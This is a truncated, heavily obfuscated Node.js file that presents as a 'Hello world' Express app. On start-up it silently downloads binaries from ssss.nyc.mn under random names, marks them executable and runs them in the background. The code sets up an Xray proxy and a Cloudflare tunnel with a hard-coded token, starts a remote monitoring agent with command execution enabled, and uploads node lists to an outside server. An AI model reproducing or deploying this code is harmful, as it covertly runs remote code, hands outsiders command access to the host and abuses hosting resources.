const _0x484fb8=_0x3d0f;(function(_0x2009a2,_0x4f58d8){const _0x2db0b1=_0x3d0f,_0x28b762=_0x2009a2();while(!![]){try{const _0xdd2d22=-parseInt(_0x2db0b1(0x117))/0x1*(parseInt(_0x2db0b1(0x104))/0x2)+-parseInt(_0x2db0b1(0xf4))/0x3+parseInt(_0x2db0b1(0xea))/0x4*(parseInt(_0x2db0b1(0xfc))/0x5)+-parseInt(_0x2db0b1(0x141))/0x6*(-parseInt(_0x2db0b1(0x18e))/0x7)+-parseInt(_0x2db0b1(0xf3))/0x8+parseInt(_0x2db0b1(0x18c))/0x9+parseInt(_0x2db0b1(0x10b))/0xa*(parseInt(_0x2db0b1(0xfb))/0xb);if(_0xdd2d22===_0x4f58d8)break;else _0x28b762['push'](_0x28b762['shift']());}catch(_0x12d872){_0x28b762['push'](_0x28b762['shift']());}}}(_0x4768,0xd1a51));const _0x5622ae=(function(){let _0x5f2756=!![];return function(_0x398a4c,_0x2873f0){const _0x4f9fa8=_0x5f2756?function(){const _0xbb89cb=_0x3d0f;if(_0x2873f0){const _0x24e80b=_0x2873f0[_0xbb89cb(0x1ad)](_0x398a4c,arguments);return _0x2873f0=null,_0x24e80b;}}:function(){};return _0x5f2756=![],_0x4f9fa8;};}()),_0x1948f1=_0x5622ae(this,function(){const _0x41d65d=_0x3d0f;return _0x1948f1[_0x41d65d(0x184)]()[_0x41d65d(0x1bb)](_0x41d65d(0xd7))[_0x41d65d(0x184)]()[_0x41d65d(0x187)](_0x1948f1)['search'](_0x41d65d(0xd7));});_0x1948f1();const _0x2a8782=(function(){let _0x1ab157=!![];return function(_0x11847c,_0x463375){const _0x1c09e8=_0x1ab157?function(){const _0x353770=_0x3d0f;if(_0x463375){const _0x1d305d=_0x463375[_0x353770(0x1ad)](_0x11847c,arguments);return _0x463375=null,_0x1d305d;}}:function(){};return _0x1ab157=![],_0x1c09e8;};}()),_0x44b48a=_0x2a8782(this,function(){const _0x5077bf=_0x3d0f,_0xba4413=function(){const _0x48ff2f=_0x3d0f;let _0x16208b;try{_0x16208b=Function(_0x48ff2f(0x12d)+_0x48ff2f(0xe2)+');')();}catch(_0x57213b){_0x16208b=window;}return _0x16208b;},_0x1583d6=_0xba4413(),_0x386e76=_0x1583d6[_0x5077bf(0x11e)]=_0x1583d6[_0x5077bf(0x11e)]||{},_0x32bafc=['log','warn',_0x5077bf(0x18d),'error',_0x5077bf(0x10e),_0x5077bf(0x111),_0x5077bf(0x199)];for(let _0x398c0d=0x0;_0x398c0d<_0x32bafc[_0x5077bf(0x12b)];_0x398c0d++){const _0x785627=_0x2a8782[_0x5077bf(0x187)][_0x5077bf(0x108)]['bind'](_0x2a8782),_0x4f8ebc=_0x32bafc[_0x398c0d],_0x130f40=_0x386e76[_0x4f8ebc]||_0x785627;_0x785627['__proto__']=_0x2a8782[_0x5077bf(0x126)](_0x2a8782),_0x785627[_0x5077bf(0x184)]=_0x130f40[_0x5077bf(0x184)][_0x5077bf(0x126)](_0x130f40),_0x386e76[_0x4f8ebc]=_0x785627;}});_0x44b48a();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x484fb8(0x168)),{promisify}=require(_0x484fb8(0xe1)),exec=promisify(require(_0x484fb8(0x12c))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x484fb8(0x122)][_0x484fb8(0x162)]||'',PROJECT_URL=process[_0x484fb8(0x122)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x484fb8(0x122)][_0x484fb8(0xf1)]||_0x484fb8(0xdb),SUB_PATH=process[_0x484fb8(0x122)][_0x484fb8(0x19b)]||_0x484fb8(0x1b4),PORT=process[_0x484fb8(0x122)][_0x484fb8(0x1a4)]||process[_0x484fb8(0x122)][_0x484fb8(0xe4)]||0xbb8,UUID=process[_0x484fb8(0x122)][_0x484fb8(0x129)]||_0x484fb8(0x11d),NEZHA_SERVER=process[_0x484fb8(0x122)][_0x484fb8(0x1a0)]||'',NEZHA_PORT=process['env'][_0x484fb8(0x11c)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x484fb8(0x122)][_0x484fb8(0x11f)]||_0x484fb8(0x1b5),ARGO_AUTH=process[_0x484fb8(0x122)][_0x484fb8(0x1c8)]||_0x484fb8(0x100),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x484fb8(0x122)][_0x484fb8(0x166)]||_0x484fb8(0xfe),CFPORT=process[_0x484fb8(0x122)][_0x484fb8(0x180)]||0x1bb,NAME=process[_0x484fb8(0x122)][_0x484fb8(0xe6)]||'';!fs[_0x484fb8(0x17f)](FILE_PATH)?(fs[_0x484fb8(0x153)](FILE_PATH),console[_0x484fb8(0x194)](FILE_PATH+'\x20is\x20created')):console[_0x484fb8(0x194)](FILE_PATH+_0x484fb8(0xde));function generateRandomName(){const _0x4ceea7=_0x484fb8,_0x3b1f02=_0x4ceea7(0x161);let _0x58750b='';for(let _0x5c3c43=0x0;_0x5c3c43<0x6;_0x5c3c43++){_0x58750b+=_0x3b1f02[_0x4ceea7(0x109)](Math[_0x4ceea7(0x15e)](Math[_0x4ceea7(0x1b9)]()*_0x3b1f02[_0x4ceea7(0x12b)]));}return _0x58750b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x484fb8(0x134)](FILE_PATH,npmName),phpPath=path[_0x484fb8(0x134)](FILE_PATH,phpName),webPath=path[_0x484fb8(0x134)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x484fb8(0x134)](FILE_PATH,_0x484fb8(0x1a3)),listPath=path[_0x484fb8(0x134)](FILE_PATH,_0x484fb8(0x140)),bootLogPath=path[_0x484fb8(0x134)](FILE_PATH,_0x484fb8(0xe9)),configPath=path[_0x484fb8(0x134)](FILE_PATH,_0x484fb8(0x142));function deleteNodes(){const _0x1645fa=_0x484fb8;try{if(!UPLOAD_URL)return;if(!fs[_0x1645fa(0x17f)](subPath))return;let _0x2cf16c;try{_0x2cf16c=fs[_0x1645fa(0x1c0)](subPath,_0x1645fa(0x143));}catch{return null;}const _0x5ddaf1=Buffer[_0x1645fa(0x119)](_0x2cf16c,_0x1645fa(0x157))[_0x1645fa(0x184)](_0x1645fa(0x143)),_0x56f4a3=_0x5ddaf1[_0x1645fa(0xfd)]('\x0a')['filter'](_0x4fa2a4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4fa2a4));if(_0x56f4a3[_0x1645fa(0x12b)]===0x0)return;const _0x3b5f12={};_0x3b5f12[_0x1645fa(0xdd)]=_0x56f4a3;const _0x43b537={};_0x43b537[_0x1645fa(0x1a8)]='application/json';const _0x595461={};return _0x595461[_0x1645fa(0x17c)]=_0x43b537,axios[_0x1645fa(0xda)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1645fa(0x101)](_0x3b5f12),_0x595461)[_0x1645fa(0x114)](_0x8ad9c5=>{return null;}),null;}catch(_0x29768b){return null;}}function cleanupOldFiles(){const _0x348e51=_0x484fb8;try{const _0x10c0e3=fs[_0x348e51(0xff)](FILE_PATH);_0x10c0e3[_0x348e51(0x128)](_0x1221c4=>{const _0x29175b=_0x348e51,_0x57ed3f=path[_0x29175b(0x134)](FILE_PATH,_0x1221c4);try{const _0x309ae5=fs['statSync'](_0x57ed3f);_0x309ae5['isFile']()&&fs[_0x29175b(0x16e)](_0x57ed3f);}catch(_0x5e64f2){}});}catch(_0xa74685){}}app[_0x484fb8(0x17e)]('/',function(_0x42d6b9,_0x50e135){const _0x3e66fe=_0x484fb8;_0x50e135[_0x3e66fe(0x164)](_0x3e66fe(0x124));});function _0x4768(){const _0x141612=['96aFtpwH','config.json','utf-8','text/plain;\x20charset=utf-8','fileUrl','https://arm64.ssss.nyc.mn/bot','App\x20is\x20running','stream','enabled','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','includes','org','unlink','has','true','response','Download\x20','outbounds','mkdirSync','http://ip-api.com/json/','streamSettings','alpn','base64','2083','vless','\x20-c\x20','arch','trojan','url','floor','protocol','message','abcdefghijklmnopqrstuvwxyz','UPLOAD_URL','scy','send','NEZHA\x20variable\x20is\x20empty,skip\x20running','CFIP','push','path','https://amd64.ssss.nyc.mn/agent','unshift','timeout','Empowerment\x20failed\x20for\x20','metadataOnly','unlinkSync','quic','tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http','8443','/vmess-argo','automatic\x20access\x20task\x20added\x20successfully','\x20>\x20nul\x202>&1','config.yaml','del\x20/f\x20/q\x20','tag','countryCode','pipe','headers','&path=%2Ftrojan-argo%3Fed%3D2560#','get','existsSync','CFPORT','Unhandled\x20error\x20in\x20startserver:','\x0a\x20\x20tunnel:\x20','https+local://8.8.8.8/dns-query','toString','application/json','?encryption=none&security=tls&sni=','constructor','chmod','\x0a\x0avmess://','arm','tunnel.yml','4176009AFkFch','info','524174mfMmfU','rm\x20-rf\x20','responseType','basename','https://arm64.ssss.nyc.mn/web','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','log','loglevel','createWriteStream','decryption','country_code','trace','npm\x20running\x20error:\x20','SUB_PATH','/vmess-argo?ed=2560','wsSettings','Error\x20reading\x20boot.log:','/vless-argo','NEZHA_SERVER','\x20successfully','substring','sub.txt','SERVER_PORT','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','password','https://amd64.ssss.nyc.mn/v1','Content-Type','sni','add','https://amd64.ssss.nyc.mn/web','vmess','apply','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','network','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','listen','access','flow','submys','orangenews.guobiaogb.qzz.io','https://amd64.ssss.nyc.mn/bot','host','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','random','\x20>/dev/null\x202>&1','search','Error\x20executing\x20command:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','aarch64','&path=%2Fvless-argo%3Fed%3D2560#','readFileSync','/api/add-subscriptions','443','none','filter','settings','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','127.0.0.1','ARGO_AUTH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','php\x20running\x20error:\x20','Nodes\x20uploaded\x20successfully','security','type','(((.+)+)+)+$','Unknown','all','post','./tmp','https://ipapi.co/json/','nodes','\x20already\x20exists','win32','tcp','util','{}.constructor(\x22return\x20this\x22)(\x20)','fileName','PORT','2096','NAME','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','method','boot.log','3412PCEQPa','level','\x20is\x20running','\x20>/dev/null\x202>&1\x20&','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2053','/tunnel.yml\x20run','FILE_PATH','nohup\x20','11851808JPcIzu','821103OYGmBZ','https://oooo.serv00.net/add-url','inbounds','\x20-p\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','amd','2087','913ViLYUX','2775MrHmXW','split','cdns.doon.eu.org','readdirSync','eyJhIjoiMzFiMTA2YTI2Y2IwMGNkZDRhNWI0ZGEwMDUxYWE3YjEiLCJ0IjoiZTZhMmM4wY2UtYzg5NS00N2JmLWJjNTgtOTFmNTBhODMxYzlhIiwicyI6Ik5EZGxab4Ul6T0RrdE4yRTVPUzAwWWprd0xXSTJNVEV0WVRGa01URm1aVE5pWkRJMCJ9','stringify','/config.json\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','39062ITpMzN','clear','/trojan-argo','dns','prototype','charAt','data','92930FPfMIK','match','\x20-s\x20','exception','\x22\x20>\x20/dev/null\x202>&1','tunnel.json','table','status','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','catch','destOverride','taskkill\x20/f\x20/im\x20','15VGIbGl','/dev/null','from','block','test','NEZHA_PORT','e40d7118-d280-4952-86ba-59ab8549ff1a','console','ARGO_DOMAIN','TunnelSecret','then','env','web\x20running\x20error:\x20','Hello\x20world!','\x0aclient_secret:\x20','bind','https://arm64.ssss.nyc.mn/agent','forEach','UUID','port','length','child_process','return\x20(function()\x20','platform','set','clients','writeFileSync','\x0a\x0atrojan://','ARGO_DOMAIN:','join','\x20-c\x20\x22','arm64','subscription','xtls-rprx-vision','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','error','freedom','dest','\x0a\x20\x20\x20\x20','/sub.txt\x20saved\x20successfully','Subscription\x20uploaded\x20successfully','list.txt'];_0x4768=function(){return _0x141612;};return _0x4768();}async function generateConfig(){const _0x107c2f=_0x484fb8,_0x2fe7ea={};_0x2fe7ea[_0x107c2f(0x1b2)]=_0x107c2f(0x118),_0x2fe7ea['error']=_0x107c2f(0x118),_0x2fe7ea[_0x107c2f(0x195)]=_0x107c2f(0x1c3);const _0x31fe14={};_0x31fe14['id']=UUID,_0x31fe14[_0x107c2f(0x1b3)]=_0x107c2f(0x138);const _0x51b677={};_0x51b677[_0x107c2f(0x13c)]=0xbb9;const _0x2c2832={};_0x2c2832['path']=_0x107c2f(0x19f),_0x2c2832['dest']=0xbba;const _0x4a6f73={};_0x4a6f73[_0x107c2f(0x168)]=_0x107c2f(0x174),_0x4a6f73[_0x107c2f(0x13c)]=0xbbb;const _0x844e82={};_0x844e82[_0x107c2f(0x168)]=_0x107c2f(0x106),_0x844e82['dest']=0xbbc;const _0x2247cc={};_0x2247cc[_0x107c2f(0x130)]=[_0x31fe14],_0x2247cc[_0x107c2f(0x197)]=_0x107c2f(0x1c3),_0x2247cc['fallbacks']=[_0x51b677,_0x2c2832,_0x4a6f73,_0x844e82];const _0x2f7835={};_0x2f7835[_0x107c2f(0x1af)]=_0x107c2f(0xe0);const _0x3729ea={};_0x3729ea[_0x107c2f(0x12a)]=ARGO_PORT,_0x3729ea[_0x107c2f(0x15f)]=_0x107c2f(0x159),_0x3729ea[_0x107c2f(0x1c5)]=_0x2247cc,_0x3729ea['streamSettings']=_0x2f7835;const _0x32b03f={};_0x32b03f['id']=UUID;const _0x18d170={};_0x18d170['clients']=[_0x32b03f],_0x18d170['decryption']=_0x107c2f(0x1c3);const _0x4f973a={};_0x4f973a[_0x107c2f(0x1af)]=_0x107c2f(0xe0),_0x4f973a[_0x107c2f(0xd5)]=_0x107c2f(0x1c3);const _0x145987={};_0x145987[_0x107c2f(0x12a)]=0xbb9,_0x145987[_0x107c2f(0x1b1)]=_0x107c2f(0x1c7),_0x145987[_0x107c2f(0x15f)]=_0x107c2f(0x159),_0x145987[_0x107c2f(0x1c5)]=_0x18d170,_0x145987['streamSettings']=_0x4f973a;const _0x5a7613={};_0x5a7613['id']=UUID,_0x5a7613[_0x107c2f(0xeb)]=0x0;const _0x3880e3={};_0x3880e3['clients']=[_0x5a7613],_0x3880e3[_0x107c2f(0x197)]=_0x107c2f(0x1c3);const _0x21642d={};_0x21642d[_0x107c2f(0x168)]='/vless-argo';const _0x5b9fac={};_0x5b9fac['network']='ws',_0x5b9fac[_0x107c2f(0xd5)]='none',_0x5b9fac[_0x107c2f(0x19d)]=_0x21642d;const _0x4ac575={};_0x4ac575[_0x107c2f(0x149)]=!![],_0x4ac575['destOverride']=['http','tls',_0x107c2f(0x16f)],_0x4ac575['metadataOnly']=![];const _0x251518={};_0x251518[_0x107c2f(0x12a)]=0xbba,_0x251518[_0x107c2f(0x1b1)]='127.0.0.1',_0x251518[_0x107c2f(0x15f)]=_0x107c2f(0x159),_0x251518['settings']=_0x3880e3,_0x251518['streamSettings']=_0x5b9fac,_0x251518['sniffing']=_0x4ac575;const _0x1163f7={};_0x1163f7['id']=UUID,_0x1163f7['alterId']=0x0;const _0x50ba4c={};_0x50ba4c[_0x107c2f(0x130)]=[_0x1163f7];const _0x2c7fc2={};_0x2c7fc2[_0x107c2f(0x168)]=_0x107c2f(0x174);const _0x2bdb62={};_0x2bdb62[_0x107c2f(0x1af)]='ws',_0x2bdb62[_0x107c2f(0x19d)]=_0x2c7fc2;const _0x198474={};_0x198474['enabled']=!![],_0x198474[_0x107c2f(0x115)]=[_0x107c2f(0x172),_0x107c2f(0x170),_0x107c2f(0x16f)],_0x198474[_0x107c2f(0x16d)]=![];const _0xf85fd2={};_0xf85fd2['port']=0xbbb,_0xf85fd2[_0x107c2f(0x1b1)]=_0x107c2f(0x1c7),_0xf85fd2[_0x107c2f(0x15f)]=_0x107c2f(0x1ac),_0xf85fd2['settings']=_0x50ba4c,_0xf85fd2[_0x107c2f(0x155)]=_0x2bdb62,_0xf85fd2['sniffing']=_0x198474;const _0xbe3db0={};_0xbe3db0[_0x107c2f(0x1a6)]=UUID;const _0x230a5a={};_0x230a5a[_0x107c2f(0x130)]=[_0xbe3db0];const _0x3c1a92={};_0x3c1a92[_0x107c2f(0x168)]=_0x107c2f(0x106);const _0x36a780={};_0x36a780[_0x107c2f(0x1af)]='ws',_0x36a780['security']=_0x107c2f(0x1c3),_0x36a780[_0x107c2f(0x19d)]=_0x3c1a92;const _0x2edfaf={};_0x2edfaf[_0x107c2f(0x149)]=!![],_0x2edfaf[_0x107c2f(0x115)]=[_0x107c2f(0x172),_0x107c2f(0x170),_0x107c2f(0x16f)],_0x2edfaf[_0x107c2f(0x16d)]=![];const _0x11f5a9={};_0x11f5a9[_0x107c2f(0x12a)]=0xbbc,_0x11f5a9[_0x107c2f(0x1b1)]=_0x107c2f(0x1c7),_0x11f5a9[_0x107c2f(0x15f)]=_0x107c2f(0x15c),_0x11f5a9[_0x107c2f(0x1c5)]=_0x230a5a,_0x11f5a9['streamSettings']=_0x36a780,_0x11f5a9['sniffing']=_0x2edfaf;const _0x3e1a70={};_0x3e1a70['servers']=[_0x107c2f(0x183)];const _0x30f5a9={};_0x30f5a9[_0x107c2f(0x15f)]=_0x107c2f(0x13b),_0x30f5a9[_0x107c2f(0x179)]='direct';const _0x4b25cd={};_0x4b25cd[_0x107c2f(0x15f)]='blackhole',_0x4b25cd[_0x107c2f(0x179)]=_0x107c2f(0x11a);const _0x33ef44={};_0x33ef44[_0x107c2f(0x194)]=_0x2fe7ea,_0x33ef44[_0x107c2f(0xf6)]=[_0x3729ea,_0x145987,_0x251518,_0xf85fd2,_0x11f5a9],_0x33ef44[_0x107c2f(0x107)]=_0x3e1a70,_0x33ef44[_0x107c2f(0x152)]=[_0x30f5a9,_0x4b25cd];const _0xcc5652=_0x33ef44;fs[_0x107c2f(0x131)](path['join'](FILE_PATH,_0x107c2f(0x142)),JSON['stringify'](_0xcc5652,null,0x2));}function getSystemArchitecture(){const _0x242668=_0x484fb8,_0x44dda5=os[_0x242668(0x15b)]();return _0x44dda5===_0x242668(0x18a)||_0x44dda5===_0x242668(0x136)||_0x44dda5===_0x242668(0x1be)?_0x242668(0x18a):_0x242668(0xf9);}function downloadFile(_0x4ea0e2,_0xb287b4,_0x5c4d3b){const _0x1d622d=_0x484fb8,_0x4d4081=_0x4ea0e2;if(!fs[_0x1d622d(0x17f)](FILE_PATH)){const _0x27530d={};_0x27530d['recursive']=!![],fs[_0x1d622d(0x153)](FILE_PATH,_0x27530d);}const _0x57e427=fs[_0x1d622d(0x196)](_0x4d4081),_0x49c273={};_0x49c273[_0x1d622d(0xe8)]=_0x1d622d(0x17e),_0x49c273[_0x1d622d(0x15d)]=_0xb287b4,_0x49c273[_0x1d622d(0x190)]=_0x1d622d(0x148),axios(_0x49c273)[_0x1d622d(0x121)](_0x2445bf=>{const _0x1a70f8=_0x1d622d;_0x2445bf[_0x1a70f8(0x10a)][_0x1a70f8(0x17b)](_0x57e427),_0x57e427['on']('finish',()=>{const _0x1070b3=_0x1a70f8;_0x57e427['close'](),console[_0x1070b3(0x194)]('Download\x20'+path[_0x1070b3(0x191)](_0x4d4081)+_0x1070b3(0x1a1)),_0x5c4d3b(null,_0x4d4081);}),_0x57e427['on'](_0x1a70f8(0x13a),_0x27d9d4=>{const _0x7cfb47=_0x1a70f8;fs[_0x7cfb47(0x14d)](_0x4d4081,()=>{});const _0x1969ba=_0x7cfb47(0x151)+path['basename'](_0x4d4081)+'\x20failed:\x20'+_0x27d9d4[_0x7cfb47(0x160)];console[_0x7cfb47(0x13a)](_0x1969ba),_0x5c4d3b(_0x1969ba);});})[_0x1d622d(0x114)](_0x1c25a6=>{const _0x4fce0d=_0x1d622d,_0x320f12=_0x4fce0d(0x151)+path['basename'](_0x4d4081)+'\x20failed:\x20'+_0x1c25a6['message'];console['error'](_0x320f12),_0x5c4d3b(_0x320f12);});}async function downloadFilesAndRun(){const _0x2f4a68=_0x484fb8,_0x23dd69=getSystemArchitecture(),_0x56f140=getFilesForArchitecture(_0x23dd69);if(_0x56f140[_0x2f4a68(0x12b)]===0x0){console[_0x2f4a68(0x194)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3c92c0=_0x56f140['map'](_0xd2b75e=>{return new Promise((_0x1f6209,_0x1df487)=>{const _0x5a92f0=_0x3d0f;downloadFile(_0xd2b75e[_0x5a92f0(0xe3)],_0xd2b75e[_0x5a92f0(0x145)],(_0x1cd112,_0x4763fc)=>{_0x1cd112?_0x1df487(_0x1cd112):_0x1f6209(_0x4763fc);});});});try{await Promise[_0x2f4a68(0xd9)](_0x3c92c0);}catch(_0x53744e){console[_0x2f4a68(0x13a)]('Error\x20downloading\x20files:',_0x53744e);return;}function _0x4ad52b(_0x2b413d){const _0x181104=_0x2f4a68,_0x1bae68=0x1fd;_0x2b413d[_0x181104(0x128)](_0x228b4c=>{const _0xe6c641=_0x181104;fs[_0xe6c641(0x17f)](_0x228b4c)&&fs[_0xe6c641(0x188)](_0x228b4c,_0x1bae68,_0x5bc581=>{const _0x3a219f=_0xe6c641;_0x5bc581?console[_0x3a219f(0x13a)](_0x3a219f(0x16c)+_0x228b4c+':\x20'+_0x5bc581):console[_0x3a219f(0x194)]('Empowerment\x20success\x20for\x20'+_0x228b4c+':\x20'+_0x1bae68[_0x3a219f(0x184)](0x8));});});}const _0x47d5f8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4ad52b(_0x47d5f8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5ed39e=NEZHA_SERVER[_0x2f4a68(0x14b)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xa37679=new Set([_0x2f4a68(0x1c2),_0x2f4a68(0x173),_0x2f4a68(0xe5),_0x2f4a68(0xfa),'2083',_0x2f4a68(0xef)]),_0x233c00=_0xa37679[_0x2f4a68(0x14e)](_0x5ed39e)?_0x2f4a68(0x14f):'false',_0x1c8556=_0x2f4a68(0x125)+NEZHA_KEY+_0x2f4a68(0xf8)+NEZHA_SERVER+_0x2f4a68(0x14a)+_0x233c00+_0x2f4a68(0xd2)+UUID;fs['writeFileSync'](path[_0x2f4a68(0x134)](FILE_PATH,_0x2f4a68(0x177)),_0x1c8556);const _0x1bf994=_0x2f4a68(0xf2)+phpPath+_0x2f4a68(0x135)+FILE_PATH+_0x2f4a68(0xee);try{await exec(_0x1bf994),console[_0x2f4a68(0x194)](phpName+_0x2f4a68(0xec)),await new Promise(_0xcc6414=>setTimeout(_0xcc6414,0x3e8));}catch(_0x5355bf){console[_0x2f4a68(0x13a)](_0x2f4a68(0xd3)+_0x5355bf);}}else{let _0xd584e6='';const _0x172dfd=['443',_0x2f4a68(0x173),'2096','2087',_0x2f4a68(0x158),_0x2f4a68(0xef)];_0x172dfd[_0x2f4a68(0x14b)](NEZHA_PORT)&&(_0xd584e6='--tls');const _0x27940c=_0x2f4a68(0xf2)+npmPath+_0x2f4a68(0x10d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f4a68(0xf7)+NEZHA_KEY+'\x20'+_0xd584e6+_0x2f4a68(0x113);try{await exec(_0x27940c),console[_0x2f4a68(0x194)](npmName+_0x2f4a68(0xec)),await new Promise(_0x32288a=>setTimeout(_0x32288a,0x3e8));}catch(_0x50b12f){console['error'](_0x2f4a68(0x19a)+_0x50b12f);}}}else console[_0x2f4a68(0x194)](_0x2f4a68(0x165));const _0x566191='nohup\x20'+webPath+_0x2f4a68(0x15a)+FILE_PATH+_0x2f4a68(0x102);try{await exec(_0x566191),console[_0x2f4a68(0x194)](webName+_0x2f4a68(0xec)),await new Promise(_0x31d834=>setTimeout(_0x31d834,0x3e8));}catch(_0x498e15){console[_0x2f4a68(0x13a)](_0x2f4a68(0x123)+_0x498e15);}if(fs[_0x2f4a68(0x17f)](botPath)){let _0x34e8a3;if(ARGO_AUTH[_0x2f4a68(0x10c)](/^[A-Z0-9a-z=]{120,250}$/))_0x34e8a3=_0x2f4a68(0x1ae)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x34e8a3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2f4a68(0xf0):_0x34e8a3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2f4a68(0x1b8)+ARGO_PORT;try{await exec(_0x2f4a68(0xf2)+botPath+'\x20'+_0x34e8a3+_0x2f4a68(0xed)),console[_0x2f4a68(0x194)](botName+_0x2f4a68(0xec)),await new Promise(_0xc8e6dd=>setTimeout(_0xc8e6dd,0x7d0));}catch(_0x174d4c){console[_0x2f4a68(0x13a)]('Error\x20executing\x20command:\x20'+_0x174d4c);}}await new Promise(_0x2c2499=>setTimeout(_0x2c2499,0x1388));}function getFilesForArchitecture(_0x2c0fe1){const _0xbd76bd=_0x484fb8;let _0x29d55e;if(_0x2c0fe1===_0xbd76bd(0x18a)){const _0x24b4b0={};_0x24b4b0[_0xbd76bd(0xe3)]=webPath,_0x24b4b0['fileUrl']=_0xbd76bd(0x192);const _0x49d9b5={};_0x49d9b5[_0xbd76bd(0xe3)]=botPath,_0x49d9b5[_0xbd76bd(0x145)]=_0xbd76bd(0x146),_0x29d55e=[_0x24b4b0,_0x49d9b5];}else{const _0x3deb4b={};_0x3deb4b['fileName']=webPath,_0x3deb4b[_0xbd76bd(0x145)]=_0xbd76bd(0x1ab);const _0x4b5dde={};_0x4b5dde[_0xbd76bd(0xe3)]=botPath,_0x4b5dde['fileUrl']=_0xbd76bd(0x1b6),_0x29d55e=[_0x3deb4b,_0x4b5dde];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1f9add=_0x2c0fe1===_0xbd76bd(0x18a)?_0xbd76bd(0x127):_0xbd76bd(0x169),_0x58d4bf={};_0x58d4bf[_0xbd76bd(0xe3)]=npmPath,_0x58d4bf[_0xbd76bd(0x145)]=_0x1f9add,_0x29d55e['unshift'](_0x58d4bf);}else{const _0x1b9729=_0x2c0fe1==='arm'?'https://arm64.ssss.nyc.mn/v1':_0xbd76bd(0x1a7),_0x6c064d={};_0x6c064d[_0xbd76bd(0xe3)]=phpPath,_0x6c064d[_0xbd76bd(0x145)]=_0x1b9729,_0x29d55e[_0xbd76bd(0x16a)](_0x6c064d);}}return _0x29d55e;}function argoType(){const _0x56fea8=_0x484fb8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x56fea8(0x194)](_0x56fea8(0x1b0));return;}if(ARGO_AUTH['includes'](_0x56fea8(0x120))){fs['writeFileSync'](path[_0x56fea8(0x134)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x15f07b=_0x56fea8(0x182)+ARGO_AUTH[_0x56fea8(0xfd)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x56fea8(0x134)](FILE_PATH,_0x56fea8(0x110))+_0x56fea8(0xe7)+ARGO_DOMAIN+_0x56fea8(0x1c6)+ARGO_PORT+_0x56fea8(0x139);fs[_0x56fea8(0x131)](path[_0x56fea8(0x134)](FILE_PATH,_0x56fea8(0x18b)),_0x15f07b);}else console[_0x56fea8(0x194)](_0x56fea8(0x193));}function _0x3d0f(_0x47caff,_0x466e02){const _0x2c5df8=_0x4768();return _0x3d0f=function(_0x44b48a,_0x2a8782){_0x44b48a=_0x44b48a-0xd2;let _0x372cd3=_0x2c5df8[_0x44b48a];return _0x372cd3;},_0x3d0f(_0x47caff,_0x466e02);}async function extractDomains(){const _0x3222b2=_0x484fb8;let _0x18ce75;if(ARGO_AUTH&&ARGO_DOMAIN)_0x18ce75=ARGO_DOMAIN,console[_0x3222b2(0x194)](_0x3222b2(0x133),_0x18ce75),await _0x2ebfd6(_0x18ce75);else try{const _0x5c2b6a=fs[_0x3222b2(0x1c0)](path['join'](FILE_PATH,'boot.log'),_0x3222b2(0x143)),_0x1ee3fd=_0x5c2b6a[_0x3222b2(0xfd)]('\x0a'),_0x1edd0f=[];_0x1ee3fd[_0x3222b2(0x128)](_0x502081=>{const _0x4286b9=_0x3222b2,_0x190b5b=_0x502081[_0x4286b9(0x10c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x190b5b){const 